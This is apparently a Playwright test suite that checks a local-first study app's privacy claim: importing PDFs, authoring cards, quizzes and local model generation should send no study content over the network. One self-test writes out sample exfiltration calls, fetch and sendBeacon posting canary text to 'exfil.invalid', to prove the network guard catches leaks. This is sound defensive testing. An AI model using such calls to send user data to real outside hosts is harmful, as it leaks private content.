import { expect, test, type Page } from '@playwright/test'
import { createStudyCanaries, type StudyCanaries } from './fixtures/studyContent'
import { buildTextPdf } from './fixtures/textPdf'
import { installNetworkGuard } from './networkGuard'

// Service workers are blocked so every page and worker request goes through
// context.route deterministically; Playwright routing can miss requests a
// service worker handles itself. `pnpm dev` registers no service worker, and
// the production Workbox worker only precaches same-origin build assets. See
// docs/privacy-check.md.
test.use({ serviceWorkers: 'block', viewport: { width: 1440, height: 900 } })

const PDF_FILE_NAME = 'canary-notes.pdf'
const PANTRY_TITLE = 'canary notes'
const LOCAL_PRIVATE_LABEL = 'Local Private: no study content sent for generation'

const disableWebGpu = async (page: Page): Promise<void> => {
  await page.addInitScript(() => {
    Object.defineProperty(navigator, 'gpu', { configurable: true, value: undefined })
  })
}

const importPdfAndCreatePantry = async (page: Page, canaries: StudyCanaries): Promise<void> => {
  await page.getByRole('button', { name: 'Skip intro' }).click()
  await page.getByRole('button', { name: /Create from a PDF/ }).first().click()
  await page.getByLabel('Choose a PDF').setInputFiles({
    name: PDF_FILE_NAME,
    mimeType: 'application/pdf',
    buffer: buildTextPdf(canaries.pageSentences),
  })
  await expect(page.getByText('2 text pages found')).toBeVisible()
  // The page picker dialog opens after import (PR #11): preview, select, save.
  await expect(page.getByRole('img', { name: 'Preview of page 1' })).toBeVisible()
  await page.getByRole('button', { name: 'Select page 1', exact: true }).click()
  await page.getByRole('button', { name: 'Next page' }).click()
  await expect(page.getByRole('img', { name: 'Preview of page 2' })).toBeVisible()
  await page.getByRole('button', { name: 'Select page 2', exact: true }).click()
  await page.getByRole('button', { name: 'Save selection' }).click()
  await page.getByRole('button', { name: 'Create local pantry' }).click()
  await expect(page.getByRole('heading', { level: 1, name: PANTRY_TITLE })).toBeVisible()
}

test('import, page selection, and pantry creation send no study content', async ({ context, page }) => {
  const canaries = createStudyCanaries()
  const guard = await installNetworkGuard(context, { canaries })

  await page.goto('/')
  await importPdfAndCreatePantry(page, canaries)

  // Sanity check that interception is live.
  expect(guard.records.some((request) => request.classification === 'app' && request.intercepted)).toBe(true)
  guard.assertClean('import and pantry creation')
})

test('manual authoring, study, reload, and deletion send no study content', async ({ context, page }) => {
  const canaries = createStudyCanaries()
  const guard = await installNetworkGuard(context, { canaries })
  await disableWebGpu(page)

  await page.goto('/')
  await importPdfAndCreatePantry(page, canaries)

  await page.getByRole('button', { name: 'Add manual card' }).click()
  await page.getByLabel('Question').fill(canaries.cardQuestion)
  for (const [index, option] of canaries.cardOptions.entries()) {
    await page.getByLabel(`Manual option ${index + 1}`).fill(option)
  }
  await page.getByLabel('Mark option A correct').check()
  await page.getByLabel('Cite a page (optional)').selectOption('1')
  await page.getByLabel('Exact quote from that page (optional)').fill(canaries.pageSentences[0])
  await page.getByRole('button', { name: 'Save card' }).click()
  await expect(page.getByRole('button', { name: 'Study 1 card' })).toBeEnabled()

  await page.getByRole('button', { name: 'Study 1 card' }).click()
  await page.getByRole('button', { name: canaries.cardOptions[0] }).click()
  await page.getByRole('button', { name: 'Check answer' }).click()
  await expect(page.getByText('Correct.', { exact: true })).toBeVisible()
  await page.getByRole('button', { name: 'Back to pantry' }).click()
  await expect(page.getByText(/Recorded on this device: 1 of 1 answers correct/)).toBeVisible()

  await page.reload()
  await page.getByRole('button', { name: new RegExp(PANTRY_TITLE) }).first().click()
  await expect(page.getByText(/Recorded on this device: 1 of 1 answers correct/)).toBeVisible()

  await page.getByRole('button', { name: 'Delete pantry' }).click()
  await page.getByRole('button', { name: 'Confirm local deletion' }).click()
  await expect(page.getByText('Your study sets stay on this device.')).toBeVisible()

  guard.assertClean('manual authoring, study, reload, and deletion')
})

test('Quiz answers, ingredient rewards, and the Treat Shelf send no study content', async ({ context, page }) => {
  const canaries = createStudyCanaries()
  const guard = await installNetworkGuard(context, { canaries })
  await disableWebGpu(page)

  await page.goto('/')
  await importPdfAndCreatePantry(page, canaries)

  await page.getByRole('button', { name: 'Add manual card' }).click()
  await page.getByLabel('Question').fill(canaries.cardQuestion)
  for (const [index, option] of canaries.cardOptions.entries()) {
    await page.getByLabel(`Manual option ${index + 1}`).fill(option)
  }
  await page.getByLabel('Mark option A correct').check()
  await page.getByRole('button', { name: 'Save card' }).click()
  await expect(page.getByRole('button', { name: 'Study 1 card' })).toBeEnabled()

  await page.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Learning Hub' }).click()
  await page.getByRole('link', { name: /Quiz/ }).click()
  await page.getByRole('link', { name: `Quiz ${PANTRY_TITLE}` }).click()
  await page.getByRole('button', { name: canaries.cardOptions[0] }).click()
  await page.getByRole('button', { name: 'Check answer' }).click()
  await expect(page.getByText('Ingredient found')).toBeVisible()
  await page.getByRole('button', { name: /See results/ }).click()
  await page.getByRole('link', { name: 'Open the Treat Shelf' }).click()
  await expect(page.getByRole('heading', { name: 'Make something sweet for Rokki.' })).toBeVisible()
  await expect(page.getByRole('heading', { name: 'Your ingredients' })).toBeVisible()

  guard.assertClean('quiz and treat shelf')
})

test('local generation without WebGPU shows unsupported state and manual authoring', async ({ context, page }) => {
  const canaries = createStudyCanaries()
  const guard = await installNetworkGuard(context, { canaries })
  await disableWebGpu(page)

  await page.goto('/')
  await importPdfAndCreatePantry(page, canaries)
  await page.getByRole('button', { name: 'Generate local cards' }).click()

  await expect(page.getByText(/WebGPU is unavailable in this browser/)).toBeVisible()
  // localAiClient.ts reports 'unsupported' and then its catch block overwrites
  // the badge with 'error' (Member 1's lane). Accept either badge while the
  // unsupported message is shown.
  await expect(page.locator('.model-status')).toHaveText(/^(unsupported|error)$/)
  await expect(page.getByRole('button', { name: 'Add manual card' })).toBeVisible()

  guard.assertClean('generation without WebGPU')
  expect(guard.modelAssetRequests()).toEqual([])
})

test("local generation with the browser's real WebGPU never leaks study content", async ({ context, page }) => {
  const canaries = createStudyCanaries()
  // Stub mode answers model-asset requests locally with 503, so this test never
  // downloads a model and passes whether or not WebGPU is available.
  const guard = await installNetworkGuard(context, { canaries, modelAssetMode: 'stub' })

  await page.goto('/')
  await importPdfAndCreatePantry(page, canaries)
  await page.getByRole('button', { name: 'Generate local cards' }).click()

  const status = page.locator('.model-status')
  await expect(status).toHaveText(/^(unsupported|error)$/, { timeout: 60_000 })
  await expect(page.getByRole('button', { name: 'Add manual card' })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Generate local cards' })).toBeEnabled()

  const modelRequests = guard.modelAssetRequests()
  test.info().annotations.push({
    type: 'webgpu-branch',
    description: `stage=${await status.textContent()}; model-asset requests=${modelRequests.length} (${[...new Set(modelRequests.map((request) => request.origin))].join(', ')}); not intercepted=${modelRequests.filter((request) => !request.intercepted).length}`,
  })

  guard.assertClean('generation with real WebGPU')
  // Every model-asset request must have been stubbed by the guard, not sent.
  expect(modelRequests.filter((request) => !request.intercepted)).toEqual([])
})

test('live cached model generation (demo Mac only)', async ({ context, page }) => {
  test.skip(process.env.TRACCOON_E2E_LIVE_MODEL !== '1', 'Set TRACCOON_E2E_LIVE_MODEL=1 on the demo Mac.')
  // Downloads model assets into this Playwright profile on the first run. For
  // the Task 10 offline rehearsal, use the manual procedure in
  // docs/local-demo-runbook.md.
  test.setTimeout(15 * 60_000)
  const canaries = createStudyCanaries()
  const guard = await installNetworkGuard(context, { canaries, modelAssetMode: 'live' })

  await page.goto('/')
  await importPdfAndCreatePantry(page, canaries)
  await page.getByRole('button', { name: 'Generate local cards' }).click()
  await expect(page.locator('.model-status')).toHaveText(/^(ready|error)$/, { timeout: 14 * 60_000 })

  test.info().annotations.push({
    type: 'live-model',
    description: `stage=${await page.locator('.model-status').textContent()}; model-asset origins=${[...new Set(guard.modelAssetRequests().map((request) => request.origin))].join(', ')}`,
  })
  guard.assertClean('live cached model generation')
})

test('the guard flags leaks to blocked and allowlisted origins', async ({ context, page }) => {
  const canaries = createStudyCanaries()
  const guard = await installNetworkGuard(context, { canaries, modelAssetMode: 'stub' })
  await page.goto('/')
  expect(guard.violations()).toEqual([])

  // Nothing leaves the machine: exfil.invalid is aborted by the guard (and the
  // .invalid TLD never resolves), huggingface.co is stubbed with 503, and
  // /__selftest paths are answered locally with 204.
  await page.evaluate(async ({ pageSentences, cardQuestion, cardOptions }) => {
    const settle = (request: Promise<unknown>) => request.catch(() => undefined)
    await settle(fetch('https://exfil.invalid/collect', { method: 'POST', body: pageSentences[0] }))
    navigator.sendBeacon('https://exfil.invalid/beacon', cardQuestion)
    await settle(fetch(`https://huggingface.co/__traccoon_selftest?q=${encodeURIComponent(pageSentences[1])}`))
    await settle(fetch('/__selftest', { method: 'POST', body: btoa(cardOptions[0]) }))
    await settle(fetch('/__selftest2', { method: 'POST', body: '%PDF-1.4 fake' }))
  }, canaries)

  const reasonsFor = (urlPart: string): string[] =>
    guard.violations().filter(({ request }) => request.url.includes(urlPart)).flatMap(({ reasons }) => reasons)

  await expect.poll(() => reasonsFor('exfil.invalid/beacon').length).toBeGreaterThan(0)
  expect(reasonsFor('exfil.invalid/collect')).toEqual(
    expect.arrayContaining(['non-allowlisted origin https://exfil.invalid', 'contains study canary']),
  )
  expect(reasonsFor('exfil.invalid/beacon')).toEqual(
    expect.arrayContaining(['non-allowlisted origin https://exfil.invalid', 'contains study canary']),
  )
  expect(reasonsFor('huggingface.co/__traccoon_selftest')).toEqual(['contains study canary'])
  expect(reasonsFor('127.0.0.1:4174/__selftest2')).toEqual(['contains PDF bytes'])
  expect(
    guard.violations().filter(({ request }) => new URL(request.url).pathname === '/__selftest').flatMap(({ reasons }) => reasons),
  ).toEqual(['contains study canary'])
  expect(() => guard.assertClean('self-test')).toThrow(/exfil\.invalid/)
})

test('the UI shows the Local Private label without an absolute byte claim', async ({ page }) => {
  await page.goto('/')
  await page.getByRole('button', { name: 'Skip intro' }).click()
  await expect(page.getByText(LOCAL_PRIVATE_LABEL, { exact: true })).toBeVisible()
  await expect(page.getByText(/0 bytes|bytes sent|zero bytes/i)).toHaveCount(0)
})
